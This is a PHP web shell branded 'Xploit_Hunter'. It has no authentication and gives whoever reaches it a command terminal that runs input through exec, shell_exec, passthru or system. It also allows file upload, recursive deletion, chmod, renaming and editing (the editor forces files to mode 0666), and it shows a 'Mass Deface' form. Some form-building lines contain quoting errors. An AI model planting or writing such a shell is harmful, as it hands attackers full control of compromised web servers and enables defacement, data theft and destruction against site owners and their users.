<?php
/**
 * --- Xploit_Hunter ---
 **/
error_reporting(0);
session_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "Xploit_Hunter";
$author = "Xploit_Hunter";
$theme_bg = "#0a0a0f";
$theme_fg = "#E0FF00";
$theme_highlight = "#FF00C8";
$theme_link = "#00FFF7";
$theme_link_hover = "#FF00A0";
$theme_border_color = "#7D00FF";
$theme_table_header_bg = "#1a0025";
$theme_table_row_hover = "#330033";
$theme_input_bg = "#120024";
$theme_input_fg = "#00FFB2";
$font_family = "'Orbitron', sans-serif";
$message_success_color = "#39FF14";
$message_error_color = "#FF0033";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    return basename($filename);
}

function exe($cmd) {
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    }
    return "Error: Command execution blocked.";
}

function perms($file){
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    if (!file_exists($target)) return true;
    if (!is_dir($target)) return unlink($target);
    $items = scandir($target);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($target);
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ['path' => $redirect_path];
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    header("Location: ?" . http_build_query($params));
    exit();
}

// --- INITIAL SETUP ---
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path);

// --- HANDLERS ---
if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']);
    if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)){
        redirect_with_message('success', 'UPLOAD SUCCESSFUL', $path);
    }else{
        redirect_with_message('error', 'UPLOAD FAILED', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target'];
    $action = $_POST['opt_action'];
    $current_dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
    switch ($action) {
        case 'delete':
            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESSFUL', $current_dir);
            else redirect_with_message('error', 'DELETE FAILED', $current_dir);
            break;
        case 'chmod_save':
            $perm = octdec($_POST['perm_value']);
            if(chmod($target_full_path,$perm)) redirect_with_message('success', 'CHMOD SUCCESSFUL', $current_dir);
            else redirect_with_message('error', 'CHMOD FAILED', $current_dir);
            break;
        case 'rename_save':
            $new_name_base = sanitizeFilename($_POST['new_name_value']);
            $new_full_path = dirname($target_full_path).'/'.$new_name_base;
            if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESSFUL', $current_dir);
            else redirect_with_message('error', 'RENAME FAILED', $current_dir);
            break;
        case 'edit_save':
            // Logic updated: Try to unlock and write directly
            @chmod($target_full_path, 0666);
            if(file_put_contents($target_full_path, $_POST['src_content']) !== false) {
                redirect_with_message('success', 'SAVE SUCCESSFUL', $current_dir);
            } else {
                redirect_with_message('error', 'SAVE FAILED - Permission Denied', $current_dir);
            }
            break;
    }
}

if(isset($_GET['create_new'])) {
    $create_name = sanitizeFilename($_POST['create_name']);
    $target_path_new = $path . '/' . $create_name;
    if ($_POST['create_type'] == 'file') {
        if (file_put_contents($target_path_new, '') !== false) redirect_with_message('success', 'FILE CREATED', $path);
        else redirect_with_message('error', 'FILE CREATE FAILED', $path);
    } elseif ($_POST['create_type'] == 'dir') {
        if (mkdir($target_path_new)) redirect_with_message('success', 'FOLDER CREATED', $path);
        else redirect_with_message('error', 'FOLDER CREATE FAILED', $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<title><?php echo htmlspecialchars($title); ?></title>
<style>
  body { background-color: #0f0f23; color: #00ffe7; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; }
  h1 { color: #ff2bd4; text-align: center; font-size: 36px; text-shadow: 0 0 5px #ff2bd4; margin: 20px 0; }
  a { color: #00b7ff; text-decoration: none; }
  a:hover { color: #ff2bd4; }
  table { width: 95%; max-width: 1000px; margin: 20px auto; border-collapse: collapse; background-color: #1a1a2e; border: 1px solid #8000ff; }
  th, td { border: 1px solid #8000ff; padding: 10px; text-align: left; }
  input, select, textarea { background: #0d0d20; color: #00ffe7; border: 1px solid #8000ff; padding: 5px; }
  input[type="submit"] { background: #ff2bd4; color: black; font-weight: bold; cursor: pointer; }
  .section-box { border: 2px solid #8000ff; padding: 15px; margin: 20px auto; background-color: #1a1a2e; width: 95%; max-width: 900px; }
  .main-menu { text-align: center; padding: 15px; border-top: 1px solid #8000ff; border-bottom: 1px solid #8000ff; }
  .message { text-align: center; font-weight: bold; padding: 10px; margin: 10px auto; width: 95%; }
  .message.success { background-color: #008f39; color: #fff; }
  .message.error { background-color: #a80000; color: #fff; }
</style>
</head>
<body>
<div style="text-align: center; margin: 20px 0;">
    <img src="https://raw.githubusercontent.com/xploithunter59-sudo/Xploit_Hunter/main/Xploit_Hunter.png" style="width: 150px; border-radius: 20px; border: 3px solid #7D00FF;">
    <h1><?php echo htmlspecialchars($title); ?></h1>
</div>

<?php if(isset($_GET['msg_text'])) echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; ?>

<div class="main-menu">
    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a>
</div>

<?php
if (isset($_GET['action'])) {
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        case 'cmd':
            echo '<h3>Terminal</h3><form method="POST"><input type="text" name="cmd_input" style="width:70%"><input type="submit" name="do_cmd" value="EXE"></form>';
            if(isset($_POST['do_cmd'])) echo '<pre>'.htmlspecialchars(exe($_POST['cmd_input'])).'</pre>';
            break;
        case 'upload_form':
            echo '<h3>Upload</h3><form enctype="multipart/form-data" method="POST"><input type="file" name="file_upload"><input type="submit" value="UPLOAD"></form>';
            break;
        case 'mass_deface_form':
            echo '<h3>Mass Deface</h3><form method="post"><p>Folder:<br><input type="text" name="d_dir" value="'.htmlspecialchars($path).'" style="width:100%"></p><p>Content:<br><textarea name="script_content" style="width:100%;height:150px"></textarea></p><input type="submit" name="start_mass_deface" value="START"></form>';
            break;
        case 'create_form':
            echo '<h3>Create</h3><form method="POST" action="?create_new=true&path='.urlencode($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name"> <input type="submit" value="Create"></form>';
            break;
        case 'edit_form':
            $target_file = $_GET['target_file'];
            $file_content = @file_get_contents($target_file);
            echo "<h3>Edit: ".htmlspecialchars(basename($target_file))."</h3>";
            echo '<form method="POST" action="?option=true&path='.urlencode($path).'">';
            echo '<textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars($file_content).'</textarea><br>';
            echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($target_file).'">';
            echo '<input type="hidden" name="opt_action" value="edit_save">';
            echo '<input type="submit" value="SAVE"/>'; // SAVE button is now always visible
            echo '</form>';
            break;
        case 'rename_form':
            echo "<h3>Rename</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="new_name_value" value="'.htmlspecialchars(basename($_GET['target_file'])).'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"></form>';
            break;
        case 'chmod_form':
            $cp = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4);
            echo "<h3>Chmod</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><input name="perm_value" value="'.$cp.'"><input type="hidden" name="path_target" value="'.$_GET['target_file'].'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHANGE"></form>';
            break;
    }
    echo '</div>';
} else {
    echo '<table><tr class="first"><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
    foreach (@scandir($path) as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $path . '/' . $item;
        echo '<tr>';
        echo '<td><a href="?path='.urlencode($full).'">'.$item.'</a></td>';
        echo '<td>'.(is_dir($full) ? 'DIR' : round(filesize($full)/1024, 2).' KB').'</td>';
        echo '<td>'.perms($full).'</td>';
        echo '<td><a href="?action=edit_form&target_file='.urlencode($full).'&path='.urlencode($path).'">Edit</a> | <a href="?action=rename_form&target_file='.urlencode($full).'&path='.urlencode($path).'">Rename</a></td>';
        echo '</tr>';
    }
    echo '</table>';
}
?>
</body>
</html>
